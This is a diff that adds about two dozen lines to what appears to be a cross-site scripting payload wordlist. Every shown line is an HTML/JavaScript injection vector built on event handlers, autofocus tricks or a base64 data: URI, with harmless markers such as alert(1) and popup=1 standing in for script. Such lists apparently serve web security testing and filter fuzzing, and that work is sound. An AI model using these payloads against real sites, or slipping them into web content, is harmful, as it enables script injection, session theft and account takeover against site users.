@@ -2169,3 +2169,29 @@ http://www.<script>alert(1)</script .com
 <script>({' \ '(){alert(1)}})[` \ `]()</script>
 <embed src=URL onload=alert('xss')>
 <body onload="'use strict';throw new class extends Function{}('alert(1)')``">
+<body onblur=x onload=popup=1;>
+<body onerror=popup=1;><svg/onfocus=import> 
+<body onload=popup=1;>
+<body rel='popup=1;'onerror=popup=1; onload=x >
+<button autofocus=x onchange='import'onfocus=popup=1; >
+<button data=popup=1; id='x'onfocus=popup=1; >
+<button onclick=popup=1;>
+<canvas onclick="popup=1;">
+<embed onfocus='popup=1;'><img
+<form formaction=popup=1; onclick=popup=1;><object>  
+<form href='x'onclick=popup=1;><select>
+<frameset id="x"onload=popup=1;>
+<frameset onload=popup=1;>
+<iframe onload=popup=1;>
+<img srcset=popup=1; onerror=popup=1;>
+<input onclick=popup=1; >
+<input onfocus=popup=1; autofocus="x">
+<input srcset=x href=x onclick=popup=1; >
+<link rel=import href=data:text/html;base64,PHNjcmlwdD5wb3B1cD0xOzwvc2NyaXB0Pg==>  
+<object onfocus=popup=1;>
+<select onclick="popup=1;">
+<select onclick=popup=1;>
+<source onclick=popup=1; ><frameset/onload=popup=1;>  
+<svg onclick=popup=1;>
+<svg onload=popup=1;>
+<video onclick=popup=1;>
